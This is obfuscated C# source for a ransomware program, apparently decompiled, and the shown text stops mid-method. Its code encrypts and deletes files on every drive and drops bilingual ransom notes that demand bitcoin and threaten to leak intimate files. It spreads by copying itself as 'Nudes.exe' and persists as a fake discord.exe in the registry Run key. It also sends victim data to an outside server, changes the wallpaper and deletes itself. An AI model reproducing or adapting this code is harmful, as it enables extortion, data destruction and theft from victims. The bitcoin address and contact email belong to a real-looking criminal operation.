using System;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ConsoleApp2;
using ConsoleApp2.Properties;
using Microsoft.Win32;
using webhook;

namespace conso;

public class Program
{
	private const int SHERB_NOCONFIRMATION = 1;

	private const int SHERB_NOPROGRESSUI = 2;

	private const int SHERB_NOSOUND = 4;

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private string fHAgdopEHEnjFIAfwRmPqzxnCajB;

	private string bmzOjuIzgwyJMKmMxXaAlIgiqYTc;

	private int dDFXdAkOTpyxMWqewEtREdqBVILf = 0;

	public static string nbqHdvjfXleHEIFzqRstvxbkFHgZ;

	private static Random random3 = new Random();

	public static string ID;

	public static TextBox text = new TextBox();

	public static string random;

	public static string pzPsmizpxpNwoLWjMcKCQo = "no";

	public static int ITrnhAVxbuMyYwicjsmpFu = 1;

	public static int notITrnhAVxbuMyYwicjsmpFu = 0;

	public static int KQNAbJSrqBIoLsQyCEEmPo = 29;

	private string hora;

	private string webo = "false";

	public static string rClHiCwOubDvcQVPHHZcGc = "no";

	public static string nRNaIyYicAkjDijKnSwEqX;

	public static string hWdkCepvpCfFFcbucPRgle;

	public static string password;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	private static extern IntPtr NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	[DllImport("shell32.dll")]
	private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public byte[] CETMLvkUVFWwCZvRihphJxqzpucW(byte[] RWBnCKZNQUXripFVlYwWNExLwiOe, byte[] ntxrsodZeITRZIbokXZtRvorXfim)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(ntxrsodZeITRZIbokXZtRvorXfim, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(RWBnCKZNQUXripFVlYwWNExLwiOe, 0, RWBnCKZNQUXripFVlYwWNExLwiOe.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void encryptall(string password)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory))
			{
				try
				{
					nebuPfARYQtqMlhkAMmVyQkeprKQ(driveInfo.ToString(), password);
					mensaje(driveInfo.ToString());
					messageCreator(driveInfo.ToString());
					nebuPfARYQtqMlhkAMmVyQkeprKQ("C:\\", password);
					mensaje("C:\\");
					messageCreator("C:\\");
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.StackTrace);
				}
			}
		}
	}

	public void deleteallfiles()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory))
			{
				try
				{
					xJLlHmTSUNMQAleGpyNDJhcMJzUX(driveInfo.ToString());
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.StackTrace);
				}
			}
		}
	}

	public void nrlAHHrqnMOvgCKEJSVZrXAcobms()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + "Nudes.exe"))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + "Nudes.exe");
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.StackTrace);
				}
			}
		}
	}

	public void VfCbchHzeUGQjMJLwKrfqnyyveTq()
	{
	}

	public void GZCisWWOlLOtEEBuRWtWxrpYhPHI()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
		Process.Start(processStartInfo);
	}

	public void wgmrxCuPwVYDNsGeTmZocnbEQrzg()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
	}

	public void zSotpEMYEOQibmXChDOyXYpcVJAi()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string location = Assembly.GetEntryAssembly()!.Location;
		if (File.Exists(folderPath + "\\uac_location"))
		{
			fHAgdopEHEnjFIAfwRmPqzxnCajB = File.ReadAllText(folderPath + "\\uac_location");
			string contents = "@echo off" + Environment.NewLine + ":1" + Environment.NewLine + "IF EXIST " + fHAgdopEHEnjFIAfwRmPqzxnCajB + " goto 2" + Environment.NewLine + "IF NOT EXIST " + fHAgdopEHEnjFIAfwRmPqzxnCajB + " exit" + Environment.NewLine + ":2" + Environment.NewLine + "del /F /Q " + fHAgdopEHEnjFIAfwRmPqzxnCajB + Environment.NewLine + "goto 1";
			File.WriteAllText(folderPath + "\\2.bat", contents);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = "/c cd %appdata% & 2.bat";
			Process.Start(processStartInfo);
		}
		string contents2 = "@echo off" + Environment.NewLine + ":1" + Environment.NewLine + "IF EXIST " + location + " goto 2" + Environment.NewLine + "IF NOT EXIST " + location + " exit" + Environment.NewLine + ":2" + Environment.NewLine + "del /F /Q " + location + Environment.NewLine + "goto 1";
		File.WriteAllText(folderPath + "\\1.bat", contents2);
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "cmd.exe";
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.Arguments = "/c cd %appdata% & 1.bat";
		Process.Start(processStartInfo2);
		try
		{
			if (File.Exists(folderPath + "\\uac_location"))
			{
				File.Copy(fHAgdopEHEnjFIAfwRmPqzxnCajB, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
				File.Delete(File.ReadAllText(folderPath + "\\uac_location"));
			}
			else
			{
				File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void jERBIZLjnDtyjiDulVrMbLTwizCs(string file, string password)
	{
		try
		{
			_ = new FileInfo(file).Length;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			FileInfo fileInfo = new FileInfo(file);
			byte[] rWBnCKZNQUXripFVlYwWNExLwiOe = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			string text = zcMylKfSpoFoiSHLHhyVMT(fileInfo.Name);
			byte[] bytes2 = CETMLvkUVFWwCZvRihphJxqzpucW(rWBnCKZNQUXripFVlYwWNExLwiOe, bytes);
			if (!File.Exists(folderPath + "\\ext"))
			{
				Random random = new Random();
				int length = random.Next(2, 14);
				bmzOjuIzgwyJMKmMxXaAlIgiqYTc = LFIWiRCcDsueZSjZIGMBGaCfqkNb(length);
				File.WriteAllText(folderPath + "\\ext", "." + bmzOjuIzgwyJMKmMxXaAlIgiqYTc);
			}
			else
			{
				bmzOjuIzgwyJMKmMxXaAlIgiqYTc = File.ReadAllText(folderPath + "\\ext");
			}
			char[] invalidFileNameChars = Path.GetInvalidFileNameChars();
			foreach (char oldChar in invalidFileNameChars)
			{
				text = text.Replace(oldChar, '_');
			}
			string text2 = "no";
			if (text2 == "no")
			{
				File.WriteAllBytes(fileInfo.DirectoryName + "\\" + text + ".Fucklocker", bytes2);
			}
			else
			{
				File.WriteAllBytes(fileInfo.DirectoryName + "\\" + text + bmzOjuIzgwyJMKmMxXaAlIgiqYTc, bytes2);
			}
			File.Delete(file);
			Console.WriteLine("encrypted: " + file + " >> " + file + ".Fucklocker");
			nbqHdvjfXleHEIFzqRstvxbkFHgZ = nbqHdvjfXleHEIFzqRstvxbkFHgZ + file + Environment.NewLine;
			dDFXdAkOTpyxMWqewEtREdqBVILf++;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void nebuPfARYQtqMlhkAMmVyQkeprKQ(string location, string password)
	{
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			string text = "si";
			string[] source = new string[1] { "//aqui_extensiones" };
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string fileName = Path.GetFileName(files[i]);
				string extension = Path.GetExtension(files[i]);
				string text2 = "no";
				if (files[i].Contains("Program Files") | files[i].Contains("Program Files (x86)") | files[i].Contains("windows") | files[i].Contains("Windows") | files[i].Contains("WINDOWS") | files[i].Contains("$Recycle.Bin") | files[i].Contains("MSOCache") | files[i].Contains("Documents and Settings") | files[i].Contains("Intel") | files[i].Contains("PerfLogs") | files[i].Contains("Windows.old") | files[i].Contains("AMD") | files[i].Contains("NVIDIA") | files[i].Contains("ProgramData"))
				{
					Console.ForegroundColor = ConsoleColor.Yellow;
					Console.WriteLine("[=] excluded the folder: " + files[i]);
					Console.WriteLine(Environment.NewLine);
					Console.ForegroundColor = ConsoleColor.White;
				}
				else if (!(extension == ".Fucklocker"))
				{
					if (text2 == "no")
					{
						if (!(fileName == "README.txt"))
						{
							if (text == "si")
							{
								jERBIZLjnDtyjiDulVrMbLTwizCs(files[i], password);
							}
							else if (text == "exclude")
							{
								if (!source.Contains(extension))
								{
									jERBIZLjnDtyjiDulVrMbLTwizCs(files[i], password);
								}
							}
							else if (source.Contains(extension))
							{
								jERBIZLjnDtyjiDulVrMbLTwizCs(files[i], password);
							}
						}
					}
					else
					{
						long length = new FileInfo(files[i]).Length;
						if (!(fileName == "README.txt"))
						{
							if (text == "si")
							{
								if (length <= 2147483648L)
								{
									jERBIZLjnDtyjiDulVrMbLTwizCs(files[i], password);
								}
							}
							else if (source.Contains(extension) && length <= 2147483648L)
							{
								jERBIZLjnDtyjiDulVrMbLTwizCs(files[i], password);
							}
						}
					}
				}
				for (int j = 0; j < directories.Length; j++)
				{
					nebuPfARYQtqMlhkAMmVyQkeprKQ(directories[j], password);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void mensaje(string location)
	{
		try
		{
			rClHiCwOubDvcQVPHHZcGc = "si";
			string[] contents = new string[1] { "  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nYour files have been encrypted with   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nGreetings, %USERNAME%, Your documents, photos, videos, databases and other important files have been encrypted with the strongest and most advanced encryption of military level and with a unique key, generated for this team.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\n\r\n\r\nDon't worry you can recover everything!\r\n\r\nThe private decryption key is stored on a dark web server on a secret server and no one can decrypt your files until you pay for it and get it.\r\n\r\n\r\nYou have 50 hours to send the payment, if you do not send the money within the time provided, all your files will be permanently deleted and you will never be able to recover them.\r\n\r\nA copy of all your files was sent to a server, if you do not pay, the extracted information will be disclosed. Do not hesitate that I will leak data and intimate files in deep web forums.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\nPayment will be made in p2p currency such as bitcoin, to the following address:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nYou can buy bitcoin at localbitcoins.com\r\n\r\ntotal to pay $300 dls\r\n\r\nWhen you have canceled everything, send the information to the following email: helpclients@protonmail.com\r\nwith your id (%PERSONALID%) and your private ip (%PRIVATEIP%)\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\nNote: Do not try to use decryption with any online tool, because you will lose all files.\r\nDo not force close the program you will generate an infinite bsdo, just contact me, we will solve it together.\r\n\r\nthe following list of files have been successfully encrypted,\r\n%ENCRYPTEDFILES%\r\nbeing a total of %NUMBERFILES% encrypted.\r\n\r\n\r\n-------------------------------------------------- -------------------------------------------------- ------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\n  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nTus archivos se han cifrado con   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nSaludos, %USERNAME%, Tus documentos, fotografias,, videos, bases de datos y demas archivos importantes han sido cifrados con el cifrado mas fuerte y avanzado de nivel militar y con una unica clave, generada para este equipo.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n¡No te preocupes puedes recuperar todo!\r\n\r\nLa clave de descifrado privada se almacena en un servidor en la red oscura en un servidor secreto y nadie puede descifrar tus archivos hasta que pagues por ella y la obtengas.\r\n\r\n\r\nTienes 50 horas para enviar el pago, si tu no envias el dinero dentro del tiempo proporcionado, todos tus archivos se eliminaran permanentemente y no podras recuperarlos jamas.\r\n\r\nSe envio una copia de todos tus archivos a un servidor, si no pagas, se divulgara la informacion extraida. no dudes en que filtrare datos y archivos intimos en foros de la deep web.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\nEl pago se realizara en moneda p2p como es bitcoin, al siguiente direccion:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nPuedes comprar bitcoin en localbitcoins.com\r\n\r\ntotal a pagar $300 dls\r\n\r\ncuando hayas cancelado todo, manda la informacion al siguiente correo: helpclients@protonmail.com \r\ncon tu id (%PERSONALID%) y tu ip privada (%PRIVATEIP%)\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\nNota: no intentes usar un descifrado con alguna herramienta online, porque perederas todos los archivos.\r\nNo fuerces cerrar el programa generaras un bsdo infinito, solo ponte en contacto conmigo, lo resolveremos juntos.\r\n\r\nla siguiente lista de archivos han sido encriptados correctamente, \r\n%ENCRYPTEDFILES%\r\nsiendo un total de %NUMBERFILES% encriptados.".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.UtcNow.ToString())
				.Replace("%PRIVATEIP%", DsQqYUXMkSfYUhmvvtwYmI())
				.Replace("%ENCRYPTEDFILES%", nbqHdvjfXleHEIFzqRstvxbkFHgZ)
				.Replace("%NUMBERFILES%", dDFXdAkOTpyxMWqewEtREdqBVILf.ToString()) };
			Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < directories.Length; i++)
			{
				messageCreator(directories[i]);
			}
			if (!(location.Contains("Program Files") | location.Contains("Program Files (x86)") | location.Contains("WINDOWS") | location.Contains("Windows") | location.Contains("windows") | location.Contains("$Recycle.Bin") | location.Contains("MSOCache") | location.Contains("Documents and Settings") | location.Contains("Intel") | location.Contains("PerfLogs") | location.Contains("Windows.old") | location.Contains("AMD") | location.Contains("NVIDIA") | location.Contains("ProgramData")))
			{
				File.WriteAllLines(location + "\\README.txt", contents);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void messageCreator(string location)
	{
		try
		{
			rClHiCwOubDvcQVPHHZcGc = "si";
			string[] contents = new string[1] { "  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nYour files have been encrypted with   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nGreetings, %USERNAME%, Your documents, photos, videos, databases and other important files have been encrypted with the strongest and most advanced encryption of military level and with a unique key, generated for this team.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\n\r\n\r\nDon't worry you can recover everything!\r\n\r\nThe private decryption key is stored on a dark web server on a secret server and no one can decrypt your files until you pay for it and get it.\r\n\r\n\r\nYou have 50 hours to send the payment, if you do not send the money within the time provided, all your files will be permanently deleted and you will never be able to recover them.\r\n\r\nA copy of all your files was sent to a server, if you do not pay, the extracted information will be disclosed. Do not hesitate that I will leak data and intimate files in deep web forums.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\nPayment will be made in p2p currency such as bitcoin, to the following address:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nYou can buy bitcoin at localbitcoins.com\r\n\r\ntotal to pay $300 dls\r\n\r\nWhen you have canceled everything, send the information to the following email: helpclients@protonmail.com\r\nwith your id (%PERSONALID%) and your private ip (%PRIVATEIP%)\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\nNote: Do not try to use decryption with any online tool, because you will lose all files.\r\nDo not force close the program you will generate an infinite bsdo, just contact me, we will solve it together.\r\n\r\nthe following list of files have been successfully encrypted,\r\n%ENCRYPTEDFILES%\r\nbeing a total of %NUMBERFILES% encrypted.\r\n\r\n\r\n-------------------------------------------------- -------------------------------------------------- ------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\n  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nTus archivos se han cifrado con   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nSaludos, %USERNAME%, Tus documentos, fotografias,, videos, bases de datos y demas archivos importantes han sido cifrados con el cifrado mas fuerte y avanzado de nivel militar y con una unica clave, generada para este equipo.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n¡No te preocupes puedes recuperar todo!\r\n\r\nLa clave de descifrado privada se almacena en un servidor en la red oscura en un servidor secreto y nadie puede descifrar tus archivos hasta que pagues por ella y la obtengas.\r\n\r\n\r\nTienes 50 horas para enviar el pago, si tu no envias el dinero dentro del tiempo proporcionado, todos tus archivos se eliminaran permanentemente y no podras recuperarlos jamas.\r\n\r\nSe envio una copia de todos tus archivos a un servidor, si no pagas, se divulgara la informacion extraida. no dudes en que filtrare datos y archivos intimos en foros de la deep web.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\nEl pago se realizara en moneda p2p como es bitcoin, al siguiente direccion:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nPuedes comprar bitcoin en localbitcoins.com\r\n\r\ntotal a pagar $300 dls\r\n\r\ncuando hayas cancelado todo, manda la informacion al siguiente correo: helpclients@protonmail.com \r\ncon tu id (%PERSONALID%) y tu ip privada (%PRIVATEIP%)\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\nNota: no intentes usar un descifrado con alguna herramienta online, porque perederas todos los archivos.\r\nNo fuerces cerrar el programa generaras un bsdo infinito, solo ponte en contacto conmigo, lo resolveremos juntos.\r\n\r\nla siguiente lista de archivos han sido encriptados correctamente, \r\n%ENCRYPTEDFILES%\r\nsiendo un total de %NUMBERFILES% encriptados.".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.UtcNow.ToString())
				.Replace("%PRIVATEIP%", DsQqYUXMkSfYUhmvvtwYmI())
				.Replace("%ENCRYPTEDFILES%", nbqHdvjfXleHEIFzqRstvxbkFHgZ)
				.Replace("%NUMBERFILES%", dDFXdAkOTpyxMWqewEtREdqBVILf.ToString()) };
			if (!(location.Contains("Program Files") | location.Contains("Program Files (x86)") | location.Contains("WINDOWS") | location.Contains("Windows") | location.Contains("windows") | location.Contains("$Recycle.Bin") | location.Contains("MSOCache") | location.Contains("Documents and Settings") | location.Contains("Intel") | location.Contains("PerfLogs") | location.Contains("Windows.old") | location.Contains("AMD") | location.Contains("NVIDIA") | location.Contains("ProgramData")))
			{
				File.WriteAllLines(location + "\\README.txt", contents);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static string CreatePassword()
	{
		Random random = new Random();
		int count = random.Next(25, 65);
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/9mKxVSVZyoJIjB&!lDQ9ZwG0*!=&?/", count)
			select s[random3.Next(s.Length)]).ToArray());
	}

	public static string LFIWiRCcDsueZSjZIGMBGaCfqkNb(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/9mKxVSVZyoJIjB&!lDQ9ZwG0"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/9mKxVSVZyoJIjB&!lDQ9ZwG0".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static string DsQqYUXMkSfYUhmvvtwYmI()
	{
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		int num = 0;
		IPAddress iPAddress;
		while (true)
		{
			if (num < addressList.Length)
			{
				iPAddress = addressList[num];
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					break;
				}
				num++;
				continue;
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		return iPAddress.ToString();
	}

	public static string KDbDpnhifQfnLwbtxggCQDdioVXD(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static string zcMylKfSpoFoiSHLHhyVMT(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static void jhsZYjgPhjeUTODAInHrCR()
	{
		try
		{
			string text = "http://slamtools.org/db.php";
			string address = text + "/data.php?info=" + ((Control)Program.text).get_Text();
			WebClient webClient = new WebClient();
			webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			Stream stream = webClient.OpenRead(text + "/data.txt");
			StreamReader streamReader = new StreamReader(stream);
			string text2 = streamReader.ReadToEnd();
			stream.Close();
			streamReader.Close();
			if (!text2.Contains(ID))
			{
				new WebClient().DownloadString(address);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			jhsZYjgPhjeUTODAInHrCR();
		}
	}

	public static void lSDeCACpnfBpuoEXZrzZLb()
	{
		try
		{
			File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
			random = LFIWiRCcDsueZSjZIGMBGaCfqkNb(30);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			if (File.Exists(folderPath + "\\image.jpg"))
			{
				SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
				File.Delete(folderPath + "\\image.jpg");
			}
			else
			{
				File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
				SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
				File.Delete(folderPath + "\\image" + random + ".jpg");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("ERROR: " + ex.Message);
		}
	}

	public void services()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
